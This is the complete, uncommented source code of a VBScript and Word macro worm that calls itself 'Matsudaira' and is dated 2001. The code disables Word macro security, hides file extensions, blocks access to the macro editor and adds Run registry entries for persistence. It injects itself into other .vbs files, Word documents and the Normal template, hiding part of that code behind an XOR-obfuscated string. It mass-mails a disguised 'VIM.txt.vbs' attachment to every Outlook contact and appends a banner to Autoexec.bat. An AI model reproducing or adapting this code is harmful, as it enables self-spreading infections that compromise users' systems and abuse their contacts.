''Matsudaira
'Private Sub Document_Open()
'On Error Resume Next
'Dim Attribs, FSO, Decrypt, ActualDoc, PlainText, Bucle, Char
'Dim SystemDir, CodeDOC, LinePay, TempVar, Counter, CryptText
'Set FSO = CreateObject("Scripting.FileSystemObject")
'SystemDir = FSO.GetSpecialFolder(1)
'If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = "" Or System.PrivateProfileString("", "HKEY_CLASSES_ROOT\VBSFile\ScriptEngine", "") = "" Then
'ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'ActiveDocument.VBProject.VBComponents.Item(1).Name = "ThisDocument"
'ActiveDocument.SaveAs ActiveDocument.FullName
'Exit Sub
'End If
'System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1
'System.PrivateProfileString("", "HKEY_CLASSES_ROOT\VBSFile\DefaultIcon", "") = System.PrivateProfileString("", "HKEY_CLASSES_ROOT\txtfile\DefaultIcon", "")
'System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "Hidden") = 0
'System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "HideFileExt") = 1
'System.PrivateProfileString("", "HKEY_CLASSES_ROOT\.src", "") = "VBSFile"
'If (GetAttr(ActiveDocument.FullName) And vbReadOnly) <> vbReadOnly Then
'CustomizationContext = ActiveDocument
'CommandBars("Tools").Controls("Macro").Enabled = False
'FindKey(BuildKeyCode(wdKeyAlt, wdKeyF8)).Clear
'FindKey(BuildKeyCode(wdKeyAlt, wdKeyF8)).Disable
'FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11)).Clear
'FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11)).Disable
'ActiveDocument.SaveAs ActiveDocument.FullName
'End If
'Attribs = GetAttr(NormalTemplate.FullName) And vbReadOnly
'If Attribs = 1 Then
'SetAttr NormalTemplate.FullName, vbArchive Or vbNormal
'Else
'CustomizationContext = NormalTemplate
'CommandBars("Tools").Controls("Macro").Enabled = False
'FindKey(BuildKeyCode(wdKeyAlt, wdKeyF8)).Clear
'FindKey(BuildKeyCode(wdKeyAlt, wdKeyF8)).Disable
'FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11)).Clear
'FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11)).Disable
'End If
'If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\9.0\Word\General Check", "") <> "Check Done" Then
'System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\9.0\Word\General Check", "") = "Check Done"
'System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\9.0\Word\General Check", "InfDone") = 0
'System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\9.0\Word\General Check", "Boot") = 0
'Open SystemDir & "\comdlg16.src" For Output As 1
'Print #1, "On Error Resume Next"
'Print #1, "Set WSHShell = WScript.CreateObject ((""WScript"" + "".Shell""))"
'Print #1, "Num = WSHShell.RegRead (""HKLM\Software\Microsoft\Office\9.0\Word\General Check\Boot"")"
'Print #1, "Num = Num + 1"
'Print #1, "WSHShell.RegWrite ""HKLM\Software\Microsoft\Office\9.0\Word\General Check\Boot"", Num"
'Close #1
'System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "comdlg") = SystemDir & "\comdlg16.src"
'End If
'If FSO.FileExists(("C:\Mat" + "sudaira_M")) = False Then
'CodeDOC = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
'Open "C:\Matsudaira_M" For Output As 1
'Print #1, CodeDOC
'Close #1
'SetAttr "C:\Matsudaira_M", vbHidden Or vbSystem
'End If
'If FSO.FileExists(SystemDir & "\w32backup.dll.vbs") = False Then
'Set ActualDoc = ActiveDocument.VBProject.VBComponents.Item(1)
'Open SystemDir & "\w32backup.dll.vbs" For Output As 1
'Counter = 1
'Print #1, ActualDoc.CodeModule.Lines(Counter, 1)
'Counter = Counter + 1
'Do While Left(ActualDoc.CodeModule.Lines(Counter, 1), 1) <> "'"
'Print #1, "'" & ActualDoc.CodeModule.Lines(Counter, 1)
'Counter = Counter + 1
'Loop
'Print #1, Right(ActualDoc.CodeModule.Lines(Counter, 1), Len(ActualDoc.CodeModule.Lines(Counter, 1)) - 1)
'Counter = Counter + 1
'Do While ActualDoc.CodeModule.Lines(Counter, 1) <> ""
'Print #1, Right(ActualDoc.CodeModule.Lines(Counter, 1), Len(ActualDoc.CodeModule.Lines(Counter, 1)) - 1)
'Counter = Counter + 1
'Loop
'Close #1
'SetAttr SystemDir & "\w32backup.dll.vbs", vbHidden Or vbSystem
'System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "w32 Backup") = SystemDir & "\w32backup.dll.vbs"
'End If
'If ActiveDocument.VBProject.VBComponents.Item(1).Name <> ("Matsu" + "daira") Then
'If System.PrivateProfileString("","HKEY_LOCAL_MACHINE\Software\Microsoft\Office\9.0\Word\General Check", "InfDone") = 0 Then
'Open ActiveDocument.Path & "\win32dll.src" For Output As 1
'Print #1, "On Error Resume Next"
'Print #1, "Set FSO = WScript.CreateObject ((""Scripting.F"" + ""ileSystemObject""))"
'Print #1, "Set RegEdit = WScript.CreateObject ((""WScri"" + ""pt.Shell""))"
'Print #1, "CurrFolder = FSO.GetParentFolderName(WScript.ScriptFullName) & ""\"""
'Print #1, "Set VirOrigin = FSO.OpenTextFile ((""C:\mat"" + ""sudaira_V""),1)"
'Print #1, "VirCode = VirOrigin.ReadAll"
'Print #1, "VirOrigin.Close"
'Print #1, "Set Word2000 = WScript.CreateObject ((""Word.Appli"" + ""cation""))"
'Print #1, "For Each File_ In FSO.GetFolder(CurrFolder).Files"
'Print #1, "If LCase(FSO.GetExtensionName(File_)) = (""d"" + ""oc"") Then"
'Print #1, "Victim = File_"
'Print #1, "Word2000.Documents.Open Victim"
'Print #1, "If Word2000.ActiveDocument.VBProject.VBComponents.Item(1).Name <> (""Matsu"" + ""daira"") Then"
'Print #1, "Word2000.ActiveDocument.VBProject.VBComponents.Item(1).Name = (""Mats"" + ""udaira"")"
'Print #1, "Word2000.ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, Word2000.ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
'PlainText = ""
'CryptText = "Vnse3111/@buhwdEnbtldou/WCQsnkdbu/WCBnlqnodour/Hudl)0(/BnedLnetmd/@eeGsnlRushof!WhsBned"
'For Bucle = 1 To 87
'TempVar = Left(CryptText, Bucle)
'Char = Right(TempVar, 1)
'Decrypt = Abs(Asc(Char)) Xor 1
'PlainText = PlainText & Chr(Decrypt)
'Next Bucle
'Print #1, PlainText
'Print #1, "Word2000.ActiveDocument.Save"
'Print #1, "End If"
'Print #1, "Word2000.ActiveDocument.Close"
'Print #1, "End If"
'Print #1, "Next"
'Print #1, "Word2000.Quit"
'Print #1, "RegEdit.RegWrite (""HKLM\Software\Microsoft\Off"" + ""ice\9.0\Word\General Check\InfDone""), 0"
'Print #1, "RegEdit.RegDelete (""HKLM\Software\Micros"" + ""oft\Windows\CurrentVersion\Run\InfDoc"")"
'Print #1, "FSO.DeleteFile (WScript.ScriptFullName)"
'Close #1
'SetAttr ActiveDocument.Path & "\win32dll.src", vbHidden Or vbSystem
'System.PrivateProfileString("","HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "InfDoc") = ActiveDocument.Path & "\win32dll.src"
'System.PrivateProfileString("","HKEY_LOCAL_MACHINE\Software\Microsoft\Office\9.0\Word\General Check", "InfDone") = 1
'End If
'End If
'If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\9.0\Word\General Check", "Boot") > 18 Then
'SetAttr "C:\Autoexec.bat", vbArchive Or vbNormal
'Open "C:\Autoexec.bat" For Input As 1
'Do While LinePay <> "ECHO   ≥                                             I-Worm/VBS/W2000M/Matsudaira ≥∞" And EOF(1) = False
'Line Input #1, LinePay
'Loop
'If LinePay = "ECHO   ≥                                             I-Worm/VBS/W2000M/Matsudaira ≥∞" Then
'Close #1
'Else
'Close #1
'Open "C:\Autoexec.bat" For Append As 1
'Print #1, ""
'Print #1, "@ECHO OFF"
'Print #1, "CLS"
'Print #1, "ECHO   ⁄ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒø"
'Print #1, "ECHO   ≥                                                                          ≥∞"
'Print #1, "ECHO   ≥  €‹ ‹€ €ﬂ‹  ﬂﬂﬂﬂﬂ ‹ﬂﬂﬂ €   € €ﬂﬂ‹ €ﬂ‹  ﬂﬂﬂ €ﬂﬂ‹ €ﬂ‹                      ≥∞"
'Print #1, "ECHO   ≥  € ﬂ € €  €   €   ﬂ‹   €   € €  € €  €  €  €‹‹ﬂ €  €                     ≥∞"
'Print #1, "ECHO   ≥  €   € €ﬂﬂ€   €     ﬂ‹ ﬂ‹‹‹ﬂ €‹‹ﬂ €ﬂﬂ€ ‹‹‹ €  € €ﬂﬂ€                     ≥∞"
'Print #1, "ECHO   ≥             ‹‹‹‹‹‹‹‹‹ﬂ                                                   ≥∞"
'Print #1, "ECHO   ≥                                                                          ≥∞"
'Print #1, "ECHO   ≥            €   € ﬂﬂﬂ €ﬂﬂ‹ €   € ‹ﬂﬂﬂ                                     ≥∞"
'Print #1, "ECHO   ≥             € €   €  €‹‹ﬂ €   € ﬂ‹                                       ≥∞"
'Print #1, "ECHO   ≥              €   ‹‹‹ €  € ﬂ‹‹‹ﬂ   ﬂ‹                                     ≥∞"
'Print #1, "ECHO   ≥                           ‹‹‹‹‹‹‹‹‹ﬂ                                     ≥∞"
'Print #1, "ECHO   ≥                                                                          ≥∞"
'Print #1, "ECHO   ≥                                                                          ≥∞"
'Print #1, "ECHO   ≥                                                                          ≥∞"
'Print #1, "ECHO   ≥                                                                          ≥∞"
'Print #1, "ECHO   ≥                                                                          ≥∞"
'Print #1, "ECHO   ≥                                                                          ≥∞"
'Print #1, "ECHO   ≥                                                                          ≥∞"
'Print #1, "ECHO   ≥                                             I-Worm/VBS/W2000M/Matsudaira ≥∞"
'Print #1, "ECHO   ≥                                              (c) 2001 by Tokugawa Ieyasu ≥∞"
'Print #1, "ECHO   ¿ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒŸ∞"
'Print #1, "ECHO    ∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞"
'Print #1, "ECHO                                                                               +"
'Print #1, "PAUSE"
'Print #1, "CLS"
'Close #1
'End If
'End If
'End Sub
On Error Resume Next
Dim mat_FSO, mat_RegEdit, mat_SystemDir, mat_TextIcon, mat_VBSOpen, mat_Tmp01, mat_Tmp02
Dim mat_X, mat_Src, mat_Dest, mat_OutLook, mat_MAPI, mat_Lists, mat_AddList, mat_Entries
Dim mat_MaleAd, mat_Male, mat_Attachs, mat_CurrFolder, mat_File, mat_Search, mat_Recips
Dim mat_Heu, mat_Files, mat_Matrix(3), mat_RegW2000, mat_W2000, mat_NormalPath, mat_VirOrigin
Dim mat_VirCode
Set mat_FSO = WScript.CreateObject (("Scripting.Fil" + "eSystemObject"))
mat_SystemDir = mat_FSO.GetSpecialFolder(1)
Set mat_RegEdit = WScript.CreateObject (("WScri" + "pt.Shell"))
mat_TextIcon = mat_RegEdit.RegRead (("HKCR\txtfile\" + "DefaultIcon\"))
mat_RegEdit.RegWrite ("HKCR\VBSFil" + "e\DefaultIcon\"), mat_TextIcon
mat_VBSOpen = mat_RegEdit.RegRead (("HKCR\VBSFile\Shell\" + "Open\Command\"))
mat_RegEdit.RegWrite ("HKCR\VBSFile\Shell" + "\Edit\Command\"), mat_VBSOpen
mat_RegEdit.RegWrite ("HKCR\VBSFile\Shell\" + "Print\Command\"), mat_VBSOpen
mat_RegEdit.RegWrite ("HKCU\Software\Micro" + "soft\Windows\CurrentVersion\Explorer\Advanced\Hidden"), 0, "REG_DWORD"
mat_RegEdit.RegWrite ("HKCU\Software\M" + "icrosoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt"), 1, "REG_DWORD"
If mat_FSO.FileExists (("C:\mats" + "udaira_V")) = False Then
Set mat_Dest = mat_FSO.CreateTextFile (("C:\m" + "atsudaira_V"), True)
Set mat_Src = mat_FSO.OpenTextFile (WScript.ScriptFullName, 1)
Do While mat_Tmp01 <> ("''Mats" + "udaira")
mat_Tmp01 = mat_Src.ReadLine
Loop
mat_Dest.WriteLine (mat_Tmp01)
Do While mat_Src.AtEndOfStream = False
mat_Tmp01 = mat_Src.ReadLine
mat_Dest.WriteLine (mat_Tmp01)
Loop
mat_Dest.Close
mat_Src.Close
End If
Set mat_Dest = mat_FSO.GetFile (("C:\matsudaira_" + "V"))
mat_Dest.Attributes = mat_Dest.Attributes + 2
If mat_FSO.FileExists (mat_SystemDir + ("\w32ba" + "ckup.dll.vbs")) = False Then
mat_Dest.Copy mat_SystemDir + ("\w" + "32backup.dll.vbs")
mat_RegEdit.RegWrite ("HKLM\Software\Microsoft" + "\Windows\CurrentVersion\Run\w32 Backup"), mat_SystemDir + (("\" + "w32ba" + "ckup.dll.vbs"))
End If
If mat_FSO.FileExists (mat_SystemDir + ("\VIM" + ".txt.vbs")) = False Then
mat_Dest.Copy mat_SystemDir + ("\VIM.txt." + "vbs"), True
End If
mat_Matrix(0) = mat_FSO.GetSpecialFolder(0)
mat_Matrix(1) = mat_FSO.GetSpecialFolder(1)
mat_Matrix(2) = mat_FSO.GetSpecialFolder(2)
mat_Matrix(3) = mat_FSO.GetParentFolderName (WScript.ScriptFullName) & "\"
For mat_Tmp02 = 0 To 3
Set mat_Heu = mat_FSO.GetFolder (mat_Matrix(mat_Tmp02))
Set mat_Files = mat_Heu.Files
For Each mat_File In mat_Files
If LCase (mat_FSO.GetExtensionName (mat_File)) = ("vb" + "s") Then
mat_Tmp01 = ""
Set mat_Dest = mat_FSO.OpenTextFile (mat_File, 8)
Set mat_Search = mat_FSO.OpenTextFile (mat_File, 1)
Do While mat_Search.AtEndOfStream = False And mat_Tmp01 <> ("''Matsud" + "aira")
mat_Tmp01 = mat_Search.ReadLine
Loop
Set mat_Src = mat_FSO.OpenTextFile (("C:\mat" + "sudaira_V"), 1)
If mat_Tmp01 <> ("''Mat" + "sudaira") Then
mat_Dest.WriteLine vbCrlf
Do While mat_Src.AtEndOfStream = False
mat_Tmp01 = mat_Src.ReadLine
mat_Dest.WriteLine (mat_Tmp01)
Loop
mat_Dest.Close
mat_Search.Close
End If
mat_Src.Close
End If
Next
Next
Set mat_OutLook = WScript.CreateObject (("Outlook." + "Application"))
Set mat_MAPI = mat_OutLook.GetNameSpace (("MA" + "PI"))
For mat_Lists = 1 To mat_MAPI.AddressLists.Count
Set mat_AddsList = mat_MAPI.AddressLists (mat_Lists)
mat_X = 1
For mat_Entries = 1 To mat_AddsList.AddressEntries.Count
mat_MaleAd = mat_AddsList.AddressEntries (mat_X)
Set mat_Male = mat_OutLook.CreateItem (0)
set mat_Recips = mat_Male.Recipients
mat_Recips.Add (mat_MaleAd)
mat_Male.Subject = ("Very Importan" + "t Message")
mat_Male.Body = ("Here is that" + " document yo" + "u were waiting f" + "or.")
mat_Male.DeleteAfterSubmit = True
Set mat_Attachs = mat_Male.Attachments
mat_Attachs.Add mat_SystemDir + ("\VI" + "M.txt.vbs")
mat_Male.Send
mat_X = mat_X + 1
Next
Next
mat_RegW2000 = mat_RegEdit.RegRead (("HKCU\Softwar" + "e\Microsoft\Office\9.0\Word\Security\Level"))
If Abs (Err.Number) <> 2147024893 Then
mat_RegEdit.RegWrite ("HKCU\Software\Microso" + "ft\Office\9.0\Word\Security\Level"), 1, "REG_DWORD"
mat_RegEdit.RegWrite ("HKC" + "R\.src\"), "VBSFile"
If mat_FSO.FileExists (("C:\mats" + "udaira_M")) = False Then
Set mat_Dest = mat_FSO.CreateTextFile (("C:\matsu" + "daira_M"), True)
Set mat_Src = mat_FSO.OpenTextFile (("C:\matsudair" + "a_V"), 1)
mat_Tmp01 = mat_Src.ReadLine
mat_Dest.WriteLine (mat_Tmp01)
mat_Tmp01 = mat_Src.ReadLine
Do While Left (mat_Tmp01, 1) = "'"
mat_Tmp02 = Right (mat_Tmp01, Len(mat_Tmp01) - 1)
mat_Dest.WriteLine (mat_Tmp02)
mat_Tmp01 = mat_Src.ReadLine
Loop
mat_Dest.WriteLine ("'" + mat_Tmp01)
Do While mat_Src.AtEndOfStream = False
mat_Tmp01 = mat_Src.ReadLine
mat_Dest.WriteLine ("'" + mat_Tmp01)
Loop
mat_Dest.Close
mat_Src.Close
End If
Set mat_Dest = mat_FSO.GetFile (("C:\matsudaira_" + "M"))
mat_Dest.Attributes = mat_Dest.Attributes + 2
Set mat_W2000 = WScript.CreateObject (("Word.App" + "lication"))
If mat_W2000.NormalTemplate.VBProject.VBComponents.Item(1).Name <> ("Matsu" + "daira") Then
Set mat_VirOrigin = FSO.OpenTextFile (("C:\mat" + "sudaira_M"),1)
mat_VirCode = mat_VirOrigin.ReadAll
mat_VirOrigin.Close
mat_W2000.NormalTemplate.VBProject.VBComponents.Item(1).Name = "Matsudaira"
mat_W2000.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, mat_W2000.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
mat_W2000.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString mat_VirCode
mat_W2000.NormalTemplate.Save
End If
mat_W2000.Quit
End If